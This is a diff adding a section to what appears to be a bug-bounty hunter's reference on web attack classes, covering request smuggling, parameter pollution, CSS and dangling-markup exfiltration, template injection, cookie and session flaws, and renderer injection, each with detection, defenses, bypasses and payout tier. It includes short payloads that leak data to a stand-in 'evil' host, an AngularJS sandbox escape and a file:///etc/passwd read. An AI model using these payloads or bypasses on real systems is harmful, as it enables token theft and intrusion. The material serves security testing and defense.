@@ -3605,3 +3605,178 @@ confirmation (§VII.4), and never let ingested text silently drive a privileged 
 > non-EVM chains, and LLM/AI, plus the frameworks, methodology, tooling and reporting
 > parts. Still hunter-first, every class with detection, defenses, **bypasses**, impact,
 > and payout tier. Expansion pass: 2026-10-11.
+
+# PART XV — MORE WEB ATTACKS (all web application classes)
+
+All-web expansion. Same format (what → found → defenses → **bypasses** → impact + Hunter
+Tier). Numbering continues from §76. These sit alongside the web classes in Parts II, V,
+IX and §60–§68.
+
+### 77. HTTP request smuggling — advanced variants  ·  **Tier S/A**
+**What.** (Deepens §34.) A front-end and back-end disagree on where one request ends and
+the next begins, so attacker bytes are **prepended to another user's request**. Beyond
+classic **CL.TE / TE.CL / TE.TE**: **CL.0** (back-end ignores `Content-Length` on
+certain endpoints), **H2.CL / H2.TE** (HTTP/2 downgrade desync — front-end speaks h2,
+back-end h1, and h2's length is authoritative so injected `Content-Length`/`Transfer-
+Encoding` desyncs), **request tunnelling**, and **client-side desync** (browser-driven,
+no proxy needed). **Found.** Timing probes and Burp **HTTP Request Smuggler**; test h2→h1
+downgrade endpoints; look for h2 request splitting via injected headers/CRLF in h2
+pseudo-headers. **Defenses.** Normalize/validate length headers, reject ambiguous
+requests, HTTP/2 end-to-end (no downgrade), front-end that rejects conflicting CL/TE.
+**Bypass.** Switch variant (CL.0, H2.CL) when one is patched; exploit header-name
+case/obfuscation and h2-specific framing the front-end doesn't normalize. **Impact.**
+Mass cross-user: steal other users' requests/sessions, bypass front-end access controls,
+poison caches, credential harvest — among the highest-impact web bugs.
+
+### 78. HTTP Parameter Pollution (HPP)  ·  **Tier B/A**
+**What.** Supplying the **same parameter twice** (`?role=user&role=admin`) exploits that
+different layers pick a different occurrence (first, last, concatenated, array). **Client-
+side HPP** injects extra params into generated links/forms; **server-side HPP** desyncs
+a WAF from the app or an app from an internal API (`a=1&a=2`). **Found.** Duplicate every
+parameter and observe which value wins at each layer; try array syntax (`a[]=`). **Defenses.**
+Canonical parameter handling, reject/define duplicate semantics, validate server-side.
+**Bypass.** Use the layer-disagreement to smuggle a value past a WAF or authz check
+(auth sees `role=user`, app honors `role=admin`); split a blocked payload across
+duplicates. **Impact.** Authz bypass, WAF evasion, logic manipulation — strong when it
+flips a privileged value.
+
+### 79. Cross-Site Script Inclusion (XSSI) / JSON hijacking  ·  **Tier B/A**
+**What.** Sensitive data served as **script-includable** JS/JSONP (or legacy array/object
+JSON) can be read cross-origin via `<script src>` because SOP doesn't block script
+*inclusion*. An attacker page includes the victim's authenticated data endpoint and
+captures it (overriding Array/Object constructors in old browsers, or just reading JSONP
+callbacks / global-variable responses). **Found.** Look for authenticated endpoints
+returning JS, JSONP (`?callback=`), or non-object-wrapped JSON; try including them
+cross-origin. **Defenses.** Return JSON as `application/json` (not script), prefix with
+`)]}',` anti-JSON-hijacking guard, require a custom header / CSRF token, no sensitive
+JSONP. **Bypass.** JSONP callback control; dynamic `<script>` with credentialed request.
+**Impact.** Cross-origin theft of user data/tokens → account compromise.
+
+### 80. CSS injection & data exfiltration  ·  **Tier B**
+**What.** Injecting attacker CSS (where HTML/JS is blocked) exfiltrates data with **no
+JavaScript**: attribute selectors (`input[value^="a"]{background:url(//evil/a)}`) leak
+secrets/CSRF tokens/password-manager values character-by-character; `@import` chains and
+font-based timing extend it; also UI redress/defacement. **Found.** Any sink accepting
+styles or `<style>`/`style=` without script; check CSP that allows styles but blocks
+script. **Defenses.** Sanitize/disallow user CSS, CSP `style-src` discipline, isolate
+sensitive values. **Bypass.** Sequential-prefix selectors to brute each char; exfil via
+background/`url()`/font loads under a script-blocking CSP. **Impact.** Steals tokens/
+secrets even when XSS is mitigated — a CSP-era data-exfil primitive.
+
+### 81. Dangling-markup injection & HTML injection (no-JS)  ·  **Tier B**
+**What.** When XSS is blocked but **HTML injection** is possible, inject *unterminated*
+markup (`<img src='//evil/?` or a dangling `<form>`/`<base>`/`<link>`) that swallows the
+following page content (CSRF tokens, secrets) up to the next quote and sends it to the
+attacker. Pure **HTML/text injection** also enables content spoofing/phishing. **Found.**
+Reflection where tags render but script is filtered; inject dangling attributes/elements.
+**Defenses.** Context-aware encoding, sanitizer that closes/normalizes markup, CSP that
+blocks off-site resource loads, no secrets inline near injectable regions. **Bypass.**
+`<base href>` hijack, dangling `src`/`href`/`action`, `<meta refresh>`, when CSP permits
+the resource load. **Impact.** Secret/token exfil and phishing without JS execution.
+
+### 82. Client-Side Template Injection (CSTI)  ·  **Tier A**
+**What.** Front-end frameworks (AngularJS `{{ }}`, Vue, etc.) that evaluate template
+expressions on **user-controlled** DOM content → client-side expression execution and,
+via **sandbox escapes**, full DOM XSS even under CSP (AngularJS `{{constructor.constructor('alert(1)')()}}`
+and version-specific escapes). Distinct from server-side SSTI (§35). **Found.** Inject
+`{{7*7}}`/framework expressions into reflected/stored content rendered by the framework;
+confirm evaluation, then escalate. **Defenses.** Don't compile user input as a template;
+`ng-non-bindable`, upgrade framework, avoid `v-html`/`$compile` on untrusted data, Trusted
+Types. **Bypass.** Known per-version sandbox escapes; expression obfuscation. **Impact.**
+DOM XSS (often CSP-bypassing) → session/account takeover.
+
+### 83. DOM-based vulnerabilities beyond XSS  ·  **Tier B/A**
+**What.** Client-side source→sink bugs other than XSS: **DOM open redirect**
+(`location = location.hash.slice(1)`), **DOM-based cookie/`localStorage` manipulation**,
+**client-side path traversal** (user input builds a fetch path), **client-side request
+forgery** (user-controlled data drives an authenticated `fetch`/XHR), **DOM link/resource
+manipulation** (controlling `src`/`href` of trusted elements). **Found.** Trace taint
+from sources (`location.*`, `postMessage`, storage, `document.referrer`) to dangerous
+sinks (`location`, `fetch`, `XHR.open`, `document.cookie`, `element.src`). DOM Invader.
+**Defenses.** Validate/encode before sinks, allowlist redirect/fetch targets, no
+untrusted data into navigation/requests. **Bypass.** Encoding, protocol-relative/`//`,
+hash vs query sources the filter misses. **Impact.** Open redirect→token theft chains,
+client-side SSRF-like requests, cookie/session manipulation.
+
+### 84. Cookie-security attacks (fixation, tossing, prefixes, persistence)  ·  **Tier A/B**
+**What.** **Session fixation** (app keeps a pre-auth session id after login → attacker
+sets it, victim logs in, attacker rides it); **cookie tossing/injection** (a sibling
+subdomain or MITM sets a `Domain=.site.com` cookie to overwrite/shadow the app's cookie →
+CSRF-token bypass, session confusion); **`__Host-`/`__Secure-` prefix** misuse (or
+validation gaps) ; **cookie jar overflow** (flood cookies to evict a security cookie);
+**session not invalidated** on logout/password-change, or **never expiring**. **Found.**
+Check if the session id rotates on login, whether cookies are overwritable from
+subdomains, whether logout/reset kills server-side sessions, token lifetime. **Defenses.**
+Regenerate session id on auth, `__Host-` cookies (host-locked), invalidate on logout/
+password change, short expiry, `Secure`/`HttpOnly`/`SameSite`. **Bypass.** Subdomain XSS/
+takeover (§42) to set cookies; overflow eviction; reuse a non-expired post-logout token.
+**Impact.** Account takeover and persistent hijack.
+
+### 85. Content-type / MIME sniffing & response-type confusion  ·  **Tier B**
+**What.** Browsers "sniff" content types when `X-Content-Type-Options: nosniff` is
+missing, so an upload/response the server labels (or doesn't) can be interpreted as HTML/
+JS → stored XSS from a "data"/upload endpoint; or an API that reflects a parameter into a
+`text/html` response. Also **JSON served as HTML**, and polyglot files. **Found.** Upload/
+reflect content and see if the browser renders it as HTML/JS; check `Content-Type` and
+`nosniff`. **Defenses.** `X-Content-Type-Options: nosniff`, correct `Content-Type`, serve
+user files from a sandboxed origin with `Content-Disposition: attachment`. **Bypass.**
+Polyglots, missing nosniff, content the server mislabels. **Impact.** Stored XSS / script
+execution from file or data endpoints.
+
+### 86. Relative Path Overwrite (RPO) & path-based style/script hijack  ·  **Tier C/B**
+**What.** When a page uses **relative** paths for CSS/JS and the server tolerant-routes
+(path info / trailing segments), an attacker URL (`/page/whatever/`) makes relative
+`style.css` resolve to an attacker-influenced/reflective path, importing attacker CSS/JS
+(→ CSS injection §80 or script). **Found.** Pages with relative resource refs + lax
+routing + reflected content. **Defenses.** Absolute resource paths, strict routing, CSP,
+`nosniff`. **Impact.** CSS/script injection via path confusion — situational, chains into
+§80/XSS.
+
+### 87. Server-side HTML-to-PDF / renderer injection  ·  **Tier A/S**
+**What.** "Export to PDF/PNG" and server-side renderers (headless Chrome, wkhtmltopdf)
+that embed **user HTML** → inject `<iframe src="file:///etc/passwd">`, `<img src=`
+pointing at internal/metadata URLs (**SSRF**, §20), or JS in the renderer context → local
+file read, SSRF to cloud metadata, and sometimes RCE. **Found.** Any generated document/
+image from user content; inject `file://`, internal URLs, and markup. **Defenses.**
+Disable local-file and JS in the renderer, allowlist resources, sandbox/network-isolate
+the renderer, treat input as untrusted HTML. **Bypass.** `file://`, `localhost`/metadata,
+redirect chains, SVG/`<object>`. **Impact.** File disclosure + SSRF→cloud takeover from a
+"harmless" export feature.
+
+### 88. Decompression bombs & upload resource exhaustion  ·  **Tier C/B**
+**What.** A tiny upload that **expands enormously** — zip bombs, highly compressible
+images ("pixel flood"/decompression bombs), or XML entity expansion (§22) — exhausts
+CPU/RAM/disk on processing → DoS. **Found.** Upload/processing features (image resize,
+archive extract, avatar, document parse); submit a crafted bomb (within rules — don't
+actually take down prod). **Defenses.** Decompressed-size and dimension limits, resource
+quotas/timeouts, stream with caps, reject over-ratio archives. **Impact.** DoS of the
+processing service — often excluded unless cheap and high-impact; rank accordingly.
+
+### 89. Session-management & token-lifecycle flaws  ·  **Tier A/B**
+**What.** Beyond fixation (§84): **tokens not revoked** on logout/password-reset/role
+change; **excessively long** or non-expiring sessions/JWTs with no server-side
+revocation; **concurrent-session** mishandling; **remember-me** tokens that are
+predictable or permanent; refresh-token rotation flaws (reuse not detected). **Found.**
+After logout/reset/role-downgrade, replay the old token — still valid? inspect JWT `exp`
+and whether the server can revoke; test refresh-token reuse. **Defenses.** Server-side
+session store with revocation, invalidate on sensitive events, short access + rotating
+refresh with reuse detection, bounded lifetimes. **Bypass.** Keep using a captured token
+past logout; replay a stolen refresh token. **Impact.** Persistent account access even
+after the user "secured" the account — raises the severity of any token leak.
+
+### 90. Transport & cookie hardening gaps (mixed content, TLS downgrade, HSTS)  ·  **Tier C**
+**What.** Missing **HSTS**, cookies without `Secure` (sent over HTTP → MITM capture),
+**mixed content** (HTTPS page loading HTTP resources → injection/MITM), and SSL-stripping
+exposure on first visit. **Found.** Check response headers (`Strict-Transport-Security`),
+cookie flags, and page resource schemes. **Defenses.** HSTS (with preload),
+`Secure`+`HttpOnly`+`SameSite` cookies, all-HTTPS resources, upgrade-insecure-requests.
+**Impact.** Mostly **Tier C** (best-practice) unless you can **demonstrate** a concrete
+MITM/session-capture path — then it rises. Classic "matters to the auditor, pays the
+hunter little" unless you prove exploitation.
+
+---
+
+> **KB growth note.** Web classes now span Parts II, V, IX, §60–§68 and §77–§90, in
+> addition to Web3 (I, VIII), cloud/K8s/CI-CD (X), API (XI), non-EVM (XIV.C) and LLM/AI
+> (XIV.D). All hunter-first with detection, defenses, **bypasses**, impact and payout
+> tier. Expansion pass: 2026-10-11.
